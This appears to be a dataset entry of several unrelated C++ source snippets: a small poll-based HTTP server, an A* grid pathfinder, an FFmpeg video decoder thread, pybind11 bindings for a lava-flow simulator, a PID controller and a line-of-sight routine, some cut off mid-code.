    "#include \"../Includes/webtest.hpp\"\n\nconst std::string PAGE_CONTENT = \"<html><body><h1>Hello, World!</h1></body></html>\";\n\nvoid servePage(int client_fd) {\n\t// Send HTTP response header\n\tstd::ostringstream response;\n\tresponse << \"HTTP/1.1 200 OK\\r\\n\";\n\tresponse << \"Content-Type: text/html\\r\\n\";\n\tresponse << \"Content-Length: \" << PAGE_CONTENT.length() << \"\\r\\n\";\n\tresponse << \"\\r\\n\"; // End of headers\n\tresponse << PAGE_CONTENT;\n\n\t// Send response to client\n\tstd::string responseStr = response.str();\n\tsend(client_fd, responseStr.c_str(), responseStr.length(), 0);\n}\n\nvoid printHTTPRequest(int client_fd)\n{\n\tconst int\tBUFFER_SIZE = 1024;\n\tchar\t\tbuffer[BUFFER_SIZE];\n\n\tstd::string\trequest;\n\tssize_t\t\tbytes_read;\n\n\twhile (1)\n\t{\n\t\tbytes_read = recv(client_fd, buffer, BUFFER_SIZE, 0);\n\t\tif (bytes_read == 0)\n\t\t\tbreak;\n\t\tif (bytes_read == -1)\n\t\t{\n\t\t\tif (errno == 35)\n\t\t\t\tcontinue;\n\t\t\telse\n\t\t\t{\n\t\t\t\tstd::cerr << \"Error in recv(): \" << strerror(errno) << std::endl;\n\t\t\t\treturn;\n\t\t\t}\n\t\t}\n\t\trequest.append(buffer, bytes_read);\n\t\tif (request.length() >= 4 && request.substr(request.length() - 4) == \"\\r\\n\\r\\n\")\n\t\t\tbreak;\n\t}\n\tstd::cout << GREEN \"Received HTTP Request:\" CLEAR << std::endl;\n\tstd::cout << request << std::endl;\n}\n\nvoid handleConnection(int client_fd)\n{\n\tprintHTTPRequest(client_fd);\n\tservePage(client_fd);\n}\n\nint\tmain(int ac, char **av)\n{\n\t(void)av;\n\tif (ac != 1)\n\t{\n\t\tstd::cerr << \"No arg for now.\" << std::endl;\n\t\treturn (1);\n\t}\n\n\t/*** SERVER SETUP ***/\n\n\ts_server\tserver;\n\n\tserver.port = SERVERPORT;\n\tserver.fd = socket(AF_INET, SOCK_STREAM, 0);\n\tif (server.fd == -1)\n\t{\n\t\tstd::cerr << \"Error: socket\" << std::endl;\n\t\treturn (1);\n\t}\n\tif (fcntl(server.fd, F_SETFL, O_NONBLOCK) == -1)\n\t{\n\t\tclose(server.fd);\n\t\tstd::cerr << \"Error: fcntl\" << std::endl;\n\t\treturn (1);\n\t}\n\n\tint\ton = true; // Has to be an int but works the same way has a bool would.\n\tif (setsockopt(server.fd, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on)) == -1)\n\t{\n\t\tclose(server.fd);\n\t\tstd::cerr << \"Error: setsockopt\" << std::endl;\n\t\treturn (1);\n\t}\n\n\tserver.sockaddr.sin_family = AF_INET;\n\tserver.sockaddr.sin_addr.s_addr = INADDR_ANY;\n\tserver.sockaddr.sin_port = htons(server.port);\n\n\tif (bind(server.fd, (const struct sockaddr*)&server.sockaddr, sizeof(server.sockaddr)) == -1)\n\t{\n\t\tclose(server.fd);\n\t\tstd::cerr << \"Error: bind\" << std::endl;\n\t\treturn (1);\n\t}\n\tif (listen(server.fd, SOMAXCONN) == -1)\n\t{\n\t\tclose(server.fd);\n\t\tstd::cerr << \"Error: listen\" << std::endl;\n\t\treturn (1);\n\t}\n\n\t/*** CONNECTIONS ***/\n\tstd::vector<pollfd>\tfds;\n\tint\t\t\t\t\tpoll_ret;\n\tint\t\t\t\t\tclient_fd;\n\n\tfds.push_back({server.fd, POLLIN, 0});\n\twhile (true)\n\t{\n\t\tpoll_ret = poll(fds.data(), fds.size(), -1);\n\t\tif (poll_ret == -1)\n\t\t{\n\t\t\tstd::cerr << \"Error in poll(): \" << strerror(errno) << std::endl;\n\t\t\tcontinue;\n\t\t}\n\t\tif (fds[0].revents & POLLIN)\n\t\t{\n\t\t\tclient_fd = accept(server.fd, NULL, NULL);\n\t\t\tif (client_fd != -1)\n\t\t\t\tfds.push_back({client_fd, POLLIN, 0});\n\t\t}\n\n\t\tfor (size_t i = 1; i < fds.size(); ++i)\n\t\t{\n\t\t\tif (fds[i].revents & POLLIN)\n\t\t\t{\n\t\t\t\thandleConnection(fds[i].fd);\n\t\t\t\tclose(fds[i].fd);\n\t\t\t\tfds.erase(fds.begin() + i);\n\t\t\t\t--i;\n\t\t\t}\n\t\t}\n\t}\n\n\tclose(server.fd);\n\treturn (0);\n}",
    "#include<iostream>\n#include<vector>\n#include<string.h>\n#include<queue>\n#include<fstream>\nconst int N = 200;\nbool vis[N][N]; // // A*\u7b97\u6cd5\u4e2d\u68c0\u6d4b\u662f\u5426\u8d70\u8fc7\u6b64\u8def\u5f84\nconst int n=N;// \u5730\u56fe\u7684\u5927\u5c0f, \u8fd9\u91cc\u6700\u5927\u4e0d\u80fd\u8d85\u8fc7N\u8fd9\u4e2a\u5e38\u91cf\u7684\u503c\n\nchar Map[N][N];\t\t// \u8f93\u5165\u7684\u5730\u56fe\nclass Position {\npublic:\n\tint x;\n\tint y;\n\tPosition(int x, int y) {\n\t\tthis->x = x;\n\t\tthis->y = y;\n\t}\n\tPosition() {\n\t\tx = -1;\n\t\ty = -1;\n\t}\n\tbool operator==(const Position &a) {\n\t\treturn (this->x == a.x) && (this->y == a.y);\n\t}\n};\nclass Point {\npublic:\n\tint x, y;\n\tint f, g, h;\n\tbool operator==(const Point& pos) {\n\t\treturn (pos.x == x && pos.y == y);\n\t}\n\tPoint(const Position& pos) {\n\t\tx = pos.x;\n\t\ty = pos.y;\n\t}\n\tPoint() {\t}\n\tvoid geth(Point beginpos, Point endpos) {\n\t\tint x = std::abs(beginpos.x = endpos.x);\n\t\tint y = std::abs(beginpos.y - endpos.y);\n\t\th = x + y;\n\t}\n\t\n\tvoid getf() {\n\t\tf = g + h;\n\t}\n};\nclass TreeNode {\n\t\npublic:\n\tPoint pos;\n\tTreeNode* pParent;\n\tstd::vector<TreeNode*> pChild;\n\t\n\t\n\tTreeNode(Point pos) {\n\t\tthis->pos = pos;\n\t\tpParent = nullptr;\n\t}\n};\nbool CanWalk(char ch[N][N], bool vis[N][N], const Point& pos)\n{\n\t//\u5982\u679c\u8d8a\u754c\uff0c\u4e0d\u80fd\u8d70\n\tif (pos.x <= 0 || pos.y <= 0 || pos.x > n || pos.y > n)\n\t{\n\t\treturn false;\n\t}\n\t//\u8d8a\u754c\n\t\n\tif (ch[pos.x][pos.y] =='#'||ch[pos.x][pos.y]=='*'|| ch[pos.x][pos.y] == 'A')// \u540e\u9762\u9700\u8981\u4fee\u6539, \u6b64\u5904\u68c0\u6d4b\u662f\u5426\u5904\u4e8e\u7a7a\u5730, \u540e\u7eed\u9700\u8981\u8003\u8651\u5bfb\u8def\u65f6\u8def\u4e0a\u7684\u673a\u5668\u4eba\n\t{\n\t\treturn false;\n\t}\n\t\n\tif (vis[pos.x][pos.y])\n\t{\n\t\treturn false;\n\t}\n\treturn true;//\u5426\u5219\u80fd\u8d70\n}\n\n\n\n\nstd::vector<Position> GetPathbyPosition(Position start, Position end) {\n\t//\u8fd4\u56de\u4e00\u4e2avector, \u5176\u4e2d\n\t//0\u4ee3\u8868\u5411\u53f3\n\t//1\u4ee3\u8868\u5411\u5de6\n\t//3\u4ee3\u8868\u5411\u4e0b\n\t//2\u4ee3\u8868\u5411\u4e0a \n\t//\u5982\u679c\u9700\u8981\u5f97\u5230\u4e24\u70b9\u95f4\u66fc\u54c8\u987f\u8ddd\u79bb\u83b7\u53d6vector\u7684size\u5373\u53ef\n\t//\u521d\u59cb\u5316\u90e8\u5206\n\tmemset(vis, false, sizeof(vis));\n\tPoint beginpos(start);\n\tPoint endpos(end);\n\tTreeNode* pRoot = new TreeNode(beginpos);\n\tstruct cmp {\n\t\tbool operator()(const TreeNode* a, const TreeNode*b) {\n\t\t\treturn a->pos.f > b->pos.f;\n\t\t}\n\t};\n\tstd::priority_queue<TreeNode*,std::vector<TreeNode*>,cmp> buff;//\u6682\u5b58\u63a2\u7d22\u8fc7\u7684\u70b9\n\tTreeNode* pCurrent = pRoot;\n\tTreeNode* pTemp = nullptr;\n\tbool isfind = false;\n\t//\u521d\u59cb\u5316\u7ed3\u675f\n\tstd::vector<Position> Path;\n\t\n\twhile (1) {\n\t\t\n\t\t\n\t\tfor (int i = 0; i <= 3; i++) {\n\t\t\tpTemp = new TreeNode(pCurrent->pos);\n\t\t\tswitch (i)\n\t\t\t{\n\t\t\t\tcase 2://up\n\t\t\t\tpTemp->pos.x--;\n\t\t\t\tpTemp->pos.g += 1;\n\t\t\t\tbreak;\n\t\t\t\tcase 3://down\n\t\t\t\tpTemp->pos.x++;\n\t\t\t\tpTemp->pos.g += 1;\n\t\t\t\tbreak;\n\t\t\t\tcase 1://left\n\t\t\t\tpTemp->pos.y--;\n\t\t\t\tpTemp->pos.g += 1;\n\t\t\t\tbreak;\n\t\t\t\tcase 0://right\n\t\t\t\tpTemp->pos.y++;\n\t\t\t\tpTemp->pos.g += 1;\n\t\t\t\tbreak;\n\t\t\t\t\n\t\t\t}\n\t\t\tif (CanWalk(Map, vis, pTemp->pos)) {\n\t\t\t\tpTemp->pos.geth(pTemp->pos, endpos);\n\t\t\t\tpTemp->pos.getf();\n\t\t\t\tpCurrent->pChild.push_back(pTemp);\n\t\t\t\tpTemp->pParent = pCurrent;\n\t\t\t\tbuff.push(pTemp);\n\t\t\t\t\n\t\t\t\tvis[pTemp->pos.x][pTemp->pos.y] = true;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tdelete pTemp;\n\t\t\t\tpTemp = nullptr;\n\t\t\t}\n\t\t}\n\t\t\n\t\tif (buff.size()==0) {\n\t\t\t//\u5982\u679c\u5bfb\u627e\u5931\u8d25,\u65e0\u8def\u53ef\u8d70\n\t\t\treturn std::vector<Position>();\n\t\t}\n\t\t\n\t\telse {\n\t\t\tpCurrent = buff.top();\n\t\t\tbuff.pop();//\u5f39\u51fa\u8be5\u70b9, \u8bf4\u660e\u5176\u5df2\u7ecf\u88ab\u5bfb\u627e\u8fc7\n\t\t}\n\t\t\n\t\tif (pCurrent->pos == endpos) {//\u627e\u5230\u4e86\n\t\t\tisfind = true;\n\t\t\t\n\t\t\tbreak;\n\t\t}\n\t\t\n\t}\n\t\n\tif (isfind) {\n\t\twhile (pCurrent != nullptr) {\n\t\t\tPosition tmp(pCurrent->pos.x, pCurrent->pos.y);\n\t\t\tPath.push_back(tmp);\n\t\t\tpCurrent = pCurrent->pParent;\n\t\t}\n\t\t\n\t}\n\t\n\treturn Path;\n}\n\nstd::vector<std::string>ConvertToOperationCodeByPostion(std::vector<Position> Path, std::string opCode[4] ){\n\t\n\t\n\t\n\tstd::vector<std::string>anspath;\n\tPosition startcpy = Path.back();\n\tPath.pop_back();\n\twhile (!Path.empty()) {\n\t\tauto tmp = Path.back();\n\t\tPath.pop_back();\n\t\tif ((startcpy.x - tmp.x) > 0) {\n\t\t\t\n\t\t\tanspath.push_back(opCode[2]);\t\n\t\t}\n\t\telse if ((startcpy.x - tmp.x) < 0) {\n\t\t\tanspath.push_back(opCode[3]);\n\t\t}\n\t\telse if ((startcpy.y - tmp.y) > 0) {\n\t\t\tanspath.push_back(opCode[1]);\n\t\t}\n\t\telse if ((startcpy.y - tmp.y) < 0) {\n\t\t\tanspath.push_back(opCode[0]);\n\t\t}\n\t\tstartcpy = tmp;\n\t}\n\treturn anspath;\n}\n\nint main(int argc, char *argv[]){\n\t\n\t// if not assign opCode \n\t// \t\tuse default opCode\n\tstd::string opCode[5]={\"0\",\"1\",\"2\",\"3\"};  \n\t//2 means up  ,3 means down ,0 means right ,1 means left  \n\t\n\t\n\tstd::string mapdir;\n\tPosition s;\n\tPosition e;\n\tint mer=0,der=0;\n\t\n\tfor (int i = 1; i < argc; ++i) {\n\t\tstd::string arg = argv[i];\n\t\tif (arg == \"-m\") {\n\t\t\tmer++;\n\t\t\tif (i + 1 < argc) { // \u786e\u4fdd\u540e\u9762\u6709\u53c2\u6570\n\t\t\t\tmapdir = argv[++i]; // \u83b7\u53d6\u53c2\u6570\u5e76\u589e\u52a0i\n\t\t\t} else {\n\t\t\t\tstd::cerr << \"argument error\" << std::endl;\n\t\t\t\treturn 1;\n\t\t\t}\n\t\t\t\n\t\t\t\n\t\t\tstd::fstream mp(mapdir,std::ios::in);\n\t\t\t\n\t\t\tif(!mp){\n\t\t\t\tstd::cerr<<\"invalid map dirction\\n\";\n\t\t\t\t\n\t\t\t}\n\t\t\tfor (int i = 0; i < n; i++) {\n\t\t\t\tfor (int j = 0; j < n; j++) {\n\t\t\t\t\tmp >> Map[i][j];\n\t\t\t\t}\n\t\t\t}\n\t\t\t\n\t\t\t\n\t\t}\n\t\telse if (arg == \"-d\") {\n\t\t\tder++;\n\t\t\tif (i + 4 < argc) { \n\t\t\t\tint sx = std::stoi( argv[++i]);\n\t\t\t\tint sy = std::stoi(argv[++i]);\n\t\t\t\tint ex =std::stoi( argv[++i]);\n\t\t\t\tint ey =std::stoi( argv[++i]);\n\t\t\t\ts=Position(sx,sy);\n\t\t\t\te=Position(ex,ey);\n\t\t\t\t\n\t\t\t\t\n\t\t\t\t\n\t\t\t} else {\n\t\t\t\tstd::cerr << \"argument error\" << std::endl;\n\t\t\t\treturn 1;\n\t\t\t}\n\t\t}\n\t}\n\t\n\t\n\t\n\t\n\tauto p=GetPathbyPosition(s,e);\t\n\t\n\tstd::fstream ans(\"./ans.txt\",std::ios::out);\n\t\n\t\t\n\tfor(auto i:p){\n\t\tans<<\"(\"<<i.x<<\",\"<<i.y<<\") \";\n\t} \n\tans<<std::endl;\n\tauto o=ConvertToOperationCodeByPostion(p,opCode",
    "#include \"VideoThread.h\"\n\nVideoThread::VideoThread() {\n\n}\n\nVideoThread::~VideoThread() {\n    if (format_context != nullptr) avformat_close_input(&format_context);\n    if (codec_context != nullptr) avcodec_free_context(&codec_context);\n    if (packet != nullptr) av_packet_free(&packet);\n    if (frame != nullptr) av_frame_free(&frame);\n}\n\nvoid VideoThread::start() {\n    prepare_codec();\n    if (pthread_create(&pid, NULL, start_thread, (void *) this) != 0) {\n        std::cout << \"\u521d\u59cb\u5316\u89c6\u9891\u7ebf\u7a0b\u5931\u8d25!\" << std::endl;\n        return;\n    }\n}\n\nvoid *VideoThread::start_thread(void *arg) {\n    VideoThread *videoThread = (VideoThread *) arg;\n    videoThread->run();\n    return nullptr;\n}\n\nvoid VideoThread::run() {\n    std::cout << \"\u89c6\u9891\u7ebf\u7a0b\u8fd0\u884c\u4e2d...\" << std::endl;\n    decodec_frame();\n}\n\nvoid VideoThread::setRender(AVRender *render) {\n    this->avRender = render;\n}\n\nvoid VideoThread::setUrl(const char *url) {\n    this->url = url;\n}\n\nvoid VideoThread::prepare_codec() {\n    int retcode;\n    //\u521d\u59cb\u5316FormatContext\n    format_context = avformat_alloc_context();\n    if (!format_context) {\n        std::cout << \"[error] alloc format context error!\" << std::endl;\n        return;\n    }\n\n    //\u6253\u5f00\u8f93\u5165\u6d41\n    retcode = avformat_open_input(&format_context, url, nullptr, nullptr);\n    if (retcode != 0) {\n        std::cout << \"[error] open input error!\" << std::endl;\n        return;\n    }\n\n    //\u8bfb\u53d6\u5a92\u4f53\u6587\u4ef6\u4fe1\u606f\n    retcode = avformat_find_stream_info(format_context, NULL);\n    if (retcode != 0) {\n        std::cout << \"[error] find stream error!\" << std::endl;\n        return;\n    }\n\n    //\u5206\u914dcodecContext\n    codec_context = avcodec_alloc_context3(NULL);\n    if (!codec_context) {\n        std::cout << \"[error] alloc codec context error!\" << std::endl;\n        return;\n    }\n\n    //\u5bfb\u627e\u5230\u89c6\u9891\u6d41\u7684\u4e0b\u6807\n    video_index = av_find_best_stream(format_context, AVMEDIA_TYPE_VIDEO, -1, -1, NULL, 0);\n    \n    //\u5c06\u89c6\u9891\u6d41\u7684\u7684\u7f16\u89e3\u7801\u4fe1\u606f\u62f7\u8d1d\u5230codecContext\u4e2d\n    retcode = avcodec_parameters_to_context(codec_context, format_context->streams[video_index]->codecpar);\n    if (retcode != 0) {\n        std::cout << \"[error] parameters to context error!\" << std::endl;\n        return;\n    }\n\n    //\u67e5\u627e\u89e3\u7801\u5668\n    codec = avcodec_find_decoder(codec_context->codec_id);\n    if (codec == nullptr) {\n        std::cout << \"[error] find decoder error!\" << std::endl;\n        return;\n    }\n\n    //\u6253\u5f00\u89e3\u7801\u5668\n    retcode = avcodec_open2(codec_context, codec, nullptr);\n    if (retcode != 0) {\n        std::cout << \"[error] open decodec error!\" << std::endl;\n        return;\n    }\n\n    //\u521d\u59cb\u5316\u4e00\u4e2apacket\n    packet = av_packet_alloc();\n    //\u521d\u59cb\u5316\u4e00\u4e2aFrame\n    frame = av_frame_alloc();\n}\n\nvoid VideoThread::decodec_frame() {\n    int sendcode = 0;\n\n    //\u8ba1\u7b97\u5e27\u7387\n    double frameRate = av_q2d(format_context->streams[video_index]->avg_frame_rate);\n    //\u8ba1\u7b97\u663e\u793a\u7684\u65f6\u95f4\n    Uint32 display_time_ms = 0;\n\n    if (!is_interval_sync) {\n        display_time_ms = sync_frame_rate(frameRate);\n    }\n\n    //\u8bb0\u5f55\u5e27\u95f4\u5ef6\u8fdf\n    clock_t start = 0, finish = 0;\n    //\u8bfb\u53d6\u5305\n    while (av_read_frame(format_context, packet) == 0) {\n        if (packet->stream_index != video_index)continue;\n        //\u63a5\u53d7\u89e3\u7801\u540e\u7684\u5e27\u6570\u636e\n        while (avcodec_receive_frame(codec_context, frame) == 0) {\n            /**\n             * \u5982\u679c\u5f00\u542f\u5e27\u95f4\u9694\u540c\u6b65\u6a21\u5f0f,\u90a3\u4e48\u662f\u6839\u636e\n             *\n             *  \u663e\u793a\u65f6\u957f = \u5f53\u524d\u5e27 - \u4e0a\u4e00\u5e27 - \u5355\u5e27\u89e3\u7801\u8017\u65f6\n             *\n             *  \u53ef\u5f97\u51fa\u5f53\u524d\u5e27\u771f\u6b63\u8981\u663e\u793a\u7684\u65f6\u95f4\n             *\n             * **/\n            if (is_interval_sync) {\n                //\u8ba1\u7b97\u4e0a\u4e00\u5e27\u4e0e\u5f53\u524d\u5e27\u7684\u5ef6\u65f6\n                display_time_ms = (Uint32) (\n                        sync_frame_interval(format_context->streams[video_index]->time_base, frame->pts) * 1000);\n                //\u5e27\u89e3\u7801\u7ed3\u675f\u65f6\u95f4\n                finish = clock();\n                double diff_time = (finish - start) / 1000;\n\n                //\u51cf\u53bb\u5e27\u95f4\u89e3\u7801\u65f6\u5dee \u5e27\u89e3\u7801\u5f00\u59cb\u65f6\u95f4 - \u5e27\u89e3\u7801\u7ed3\u675f\u65f6\u95f4\n                if (display_time_ms > diff_time)display_time_ms = display_time_ms - (Uint32) diff_time;\n            }\n            //\u7ed8\u5236\u56fe\u50cf\n            if (avRender)avRender->renderVideo(frame, display_time_ms);\n\n            av_frame_unref(frame);\n            //\u5e27\u89e3\u7801\u5f00\u59cb\u65f6\u95f4\n            start = clock();\n        }\n        //\u53d1\u9001\u89e3\u7801\u524d\u7684\u5305\u6570\u636e\n        sendcode = avcodec_send_packet(codec_context, packet);\n        //\u6839\u636e\u53d1\u9001\u7684\u8fd4\u56de\u503c\u5224\u65ad\u72b6\u6001\n        if (sendcode == 0) {\n//            std::cout << \"[debug] \" << \"SUCCESS\" << std::endl;\n        } else if (sendcode == AVERROR_EOF) {\n            std::cout << \"[debug] \" << \"EOF\" << std::endl;\n        } else if (sendcode == AVERROR(EAGAIN)) {\n            std::cout << \"[debug] \" << \"EAGAIN\" << std::endl;\n        } else {\n            // std::cout << \"[debug] \" << av_err2str(AVERROR(sendcode)) << std::endl;\n        }\n        av_packet_unref(packet);\n    }\n}\n\nUint32 VideoThread::sync_frame_rate(double frame_rate) {\n    return 1 * 1000 / frame_rate;\n}\n\ndouble VideoThread::sync_frame_interval(AVRational timebase, int pts) {\n    double display = (pts - last_pts) * av_q2d(timebase);\n    last_pts = pts;\n    std::cout << \"pts : \" << pts * av_q2d(timebase) << \"   --  display :\" << display << std::endl;\n    return display;\n}\n\n",
    "#include \"asc_file.hpp\"\n#include \"config.hpp\"\n#include \"definitions.hpp\"\n#include \"lobe.hpp\"\n#include \"simulation.hpp\"\n#include \"topography.hpp\"\n\n#define PYBIND11_DETAILED_ERROR_MESSAGES\n\n// Bindings\n#include <pybind11/operators.h>\n#include <pybind11/pybind11.h>\n#include <pybind11/stl.h>\n\n// xtensor extensions\n#define FORCE_IMPORT_ARRAY\n#include \"xtensor-python/pyarray.hpp\"\n\n// Namespaces\nusing namespace std::string_literals; // For \"\"s\nusing namespace pybind11::literals;   // For \"\"_a\nnamespace py = pybind11;              // Convention\n\nPYBIND11_MODULE( flowpycpp, m )\n{\n    xt::import_numpy();\n    m.doc() = \"Python bindings for flowy\"; // optional module docstring\n\n    py::class_<std::filesystem::path>( m, \"Path\" ).def( py::init<std::string>() );\n\n    py::implicitly_convertible<std::string, std::filesystem::path>();\n\n    py::class_<Flowy::AscCrop>( m, \"AscCrop\" )\n        .def( py::init<>() )\n        .def_readwrite( \"x_min\", &Flowy::AscCrop::x_min )\n        .def_readwrite( \"x_max\", &Flowy::AscCrop::x_max )\n        .def_readwrite( \"y_min\", &Flowy::AscCrop::y_min )\n        .def_readwrite( \"y_max\", &Flowy::AscCrop::y_max );\n\n    py::class_<Flowy::AscFile>( m, \"AscFile\" )\n        .def( py::init<>() )\n        .def( py::init<std::filesystem::path>() )\n        .def( py::init<std::filesystem::path, Flowy::AscCrop>() )\n        .def( \"save\", &Flowy::AscFile::save )\n        .def_readwrite( \"lower_left_corner\", &Flowy::AscFile::lower_left_corner )\n        .def_readwrite( \"cell_size\", &Flowy::AscFile::cell_size )\n        .def_readwrite( \"no_data_value\", &Flowy::AscFile::no_data_value )\n        .def_readwrite( \"height_data\", &Flowy::AscFile::height_data )\n        .def_readwrite( \"x_data\", &Flowy::AscFile::x_data )\n        .def_readwrite( \"y_data\", &Flowy::AscFile::y_data );\n\n    py::class_<Flowy::Lobe>( m, \"Lobe\" )\n        .def( py::init<>() )\n        .def_readwrite( \"center\", &Flowy::Lobe::center )\n        .def_readwrite( \"semi_axes\", &Flowy::Lobe::semi_axes )\n        .def_readwrite( \"dist_n_lobes\", &Flowy::Lobe::dist_n_lobes )\n        .def_readwrite( \"n_descendents\", &Flowy::Lobe::n_descendents )\n        .def_readwrite( \"idx_parent\", &Flowy::Lobe::idx_parent )\n        .def_readwrite( \"alpha_inertial\", &Flowy::Lobe::alpha_inertial )\n        .def_readwrite( \"thickness\", &Flowy::Lobe::thickness )\n        .def( \"set_azimuthal_angle\", &Flowy::Lobe::set_azimuthal_angle )\n        .def( \"get_azimuthal_angle\", &Flowy::Lobe::get_azimuthal_angle )\n        .def( \"get_sin_azimuthal_angle\", &Flowy::Lobe::get_sin_azimuthal_angle )\n        .def( \"get_cos_azimuthal_angle\", &Flowy::Lobe::get_cos_azimuthal_angle )\n        .def( \"extent_xy\", &Flowy::Lobe::extent_xy )\n        .def( \"line_segment_intersects\", &Flowy::Lobe::line_segment_intersects )\n        .def( \"is_point_in_lobe\", &Flowy::Lobe::is_point_in_lobe )\n        .def( \"point_at_angle\", &Flowy::Lobe::point_at_angle )\n        .def( \"rasterize_perimeter\", &Flowy::Lobe::rasterize_perimeter );\n\n    py::class_<Flowy::Topography>( m, \"Topography\" )\n        .def( py::init<>() )\n        .def( py::init<Flowy::MatrixX, Flowy::VectorX, Flowy::VectorX>() )\n        .def_readwrite( \"height_data\", &Flowy::Topography::height_data )\n        .def_readwrite( \"x_data\", &Flowy::Topography::x_data )\n        .def_readwrite( \"y_data\", &Flowy::Topography::y_data )\n        .def( \"cell_size\", &Flowy::Topography::cell_size )\n        .def( \"height_and_slope\", &Flowy::Topography::height_and_slope )\n        .def( \"get_cells_intersecting_lobe\", &Flowy::Topography::get_cells_intersecting_lobe )\n        .def( \"compute_intersection\", &Flowy::Topography::compute_intersection )\n        .def( \"add_lobe\", &Flowy::Topography::add_lobe )\n        .def( \"is_point_near_boundary\", &Flowy::Topography::is_point_near_boundary )\n        .def( \"locate_point\", &Flowy::Topography::locate_point )\n        .def( \"find_preliminary_budding_point\", &Flowy::Topography::find_preliminary_budding_point );\n\n    py::class_<Flowy::Topography::BoundingBox>( m, \"TopographyBoundingBox\" )\n        .def( py::init<>() )\n        .def_readwrite( \"idx_x_lower\", &Flowy::Topography::BoundingBox::idx_x_lower )\n        .def_readwrite( \"idx_y_lower\", &Flowy::Topography::BoundingBox::idx_y_lower )\n        .def_readwrite( \"idx_x_higher\", &Flowy::Topography::BoundingBox::idx_x_higher )\n        .def_readwrite( \"idx_y_higher\", &Flowy::Topography::BoundingBox::idx_y_higher );\n\n    py::class_<Flowy::Config::InputParams>( m, \"InputParams\" )\n        .def( py::init<>() )\n        .def_readwrite( \"output_folder\", &Flowy::Config::InputParams::output_folder )\n        .def_readwrite( \"run_name\", &Flowy::Config::InputParams::run_name )\n        .def_readwrite( \"source\", &Flowy::Config::InputParams::source )\n        .def_readwrite( \"vent_coordinates\", &Flowy::Config::InputParams::vent_coordinates )\n        .def_readwrite( \"save_hazard_data\", &Flowy::Config::InputParams::save_hazard_data )\n        .def_readwrite( \"n_flows\", &Flowy::Config::InputParams::n_flows )\n        .def_rea",
    "//\n// Created by 24106 on 2024/3/27.\n//\n\n#include \"pid.h\"\n\n\nfloat myabs(float input){\n    return input<0?-input:input;\n}\n\nencoder encoder1;\nencoder encoder2;\n\nfloat limit(float min,float input,float max){\n    if (input<min)\n        return min;\n    if (max<input)\n        return max;\n    return input;\n}\n\nPID::PID(float mp,float mi,float md,float mtarget,float ma):p(mp),i(mi),d(md),target(mtarget),a(ma){\n    err = 0;\n    last_err = 0;\n    previous_err = 0;\n    sum_err = 0;\n    out = 0;\n};\n\nvoid PID::Pchange(float val){\n    p = val;\n};\nvoid PID::Ichange(float val){\n    i = val;\n};\nvoid PID::Dchange(float val){\n    d = val;\n};\nfloat PID::targetVal(void) const {\n    return target;\n}\nfloat PID::Pval() {\n    return p;\n}\nfloat PID::outVal(void) const {\n    return out;\n}\nvoid PID::target_change(float val){\n    target = val;\n};\n\nvoid PID::PID_relize(float input){\n    err = target - input;\n    sum_err += err;\n    out = p * err + i * sum_err + d * (1 - a) * (err - last_err) + a * (last_err);\n    last_err = err;\n};\n\nvoid PID::PID_relize_lvbo(int input_1,int input_2){\n//    target = limit(-0,target,30);\n    err_least = target - input_1 - input_2;\n    err = err * 0.7 + err_least * 0.3;\n    sum_err += err;\n    limit(-10000,sum_err,10000);\n    out = p * err + i * sum_err + d * (1 - a) * (err - last_err) + a * (last_err);\n    last_err = err;\n}\n\nvoid PID::PID_turn(float input) {\n    err = target - input;\n    out = p * err;\n}\n\nPID pid_1(0,0,0,0,0);\nPID pid_2(0,0,0,0,0);\nPID pid_3(0,0,0,0,0);",
    "#include \"line_of_sight.hpp\"\r\n\r\n#include <vector>\r\n#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n\r\n#include \"line_algorithm.hpp\"\r\n\r\n// TODO: it may be useful to make some utility that handles the creation of things like this,\r\n// and add them to a personal library\r\n// Also, doesn't actually create a square. It can make rectangles. Bad name.\r\nstd::vector<std::vector<char>> create_square(int size_x, int size_y) {\r\n    std::vector<std::vector<char>> square;\r\n\r\n    for (int i = 0; i < size_x; i++)\r\n        square.push_back(std::vector<char>(size_y, 'X'));\r\n\r\n    return square;\r\n}\r\n\r\nvoid make_los(const std::vector<std::vector<char>>& terrain,\r\n    std::vector<std::vector<char>>& los, const std::vector<SB_LINE::Coordinate>& line) {\r\n    char tile_data = 0;\r\n    bool blocked = false;\r\n\r\n    for (int j = 0; j < line.size(); j++) {\r\n\r\n        int line_x = line[j].x, line_y = line[j].y;\r\n\r\n        tile_data = terrain[line_y][line_x];\r\n\r\n        if (tile_data == 1) {\r\n            blocked = true;\r\n            los[line_y][line_x] = 'W';\r\n        }\r\n\r\n        if (blocked == true)\r\n            break;\r\n        else\r\n            los[line_y][line_x] = ' ';\r\n\r\n    }\r\n}\r\n\r\nstd::vector<std::vector<char>> SB_LOS::line_of_sight(const std::vector<std::vector<char>>& terrain, int x, int y) {\r\n\r\n    std::vector<std::vector<char>> los = create_square(terrain.size(), terrain[0].size());\r\n\r\n    // TODO: This only makes sense if we have a contiguous array and the data in the array is large enough to impact cache hits\r\n    // The most optimal way to do this would be like so:\r\n    // Let H be values we explore when handling the top and bottom (horizontal traversal)\r\n    // and V be values we explore when handling the sides (vertical traversal)\r\n    // HHHHHHH\r\n    // H00000V\r\n    // V00000V\r\n    // V00000V\r\n    // V00000H\r\n    // HHHHHHH\r\n    // Additionally, when handling the sides, we can horizontally traverse like so:\r\n    // H000001\r\n    // 1000002\r\n    // 2000003\r\n    // 300000H\r\n\r\n    for (int z = 0; z < 2; z++) {\r\n        int row = z * (terrain.size() - 1);\r\n        for (int i = 0; i < terrain[row].size(); i++) {\r\n\r\n            std::vector<SB_LINE::Coordinate> line = SB_LINE::draw_line32b(x, i, y, row);\r\n            make_los(terrain, los, line);\r\n        }\r\n    }\r\n\r\n    for (int z = 0; z < 2; z++) {\r\n        int column = z * (terrain[0].size() - 1);\r\n        for (int i = 0; i < terrain.size(); i++) {\r\n\r\n            std::vector<SB_LINE::Coordinate> line = SB_LINE::draw_line32b(x, column, y, i);\r\n            make_los(terrain, los, line);\r\n        }\r\n    }\r\n\r\n\r\n    return los;\r\n}\r\n\r\n#define SB_LOS_TESTING\r\n#ifdef SB_LOS_TESTING\r\n\r\nvoid initialize_terrain(std::vector<std::vector<char>>& terrain, std::string input) {\r\n\r\n    std::ifstream in_file;\r\n\r\n    in_file.open(input);\r\n    if (!in_file.is_open())\r\n        throw;\r\n\r\n    std::string buffer;\r\n    while (std::getline(in_file, buffer)) {\r\n\r\n        std::vector<char> 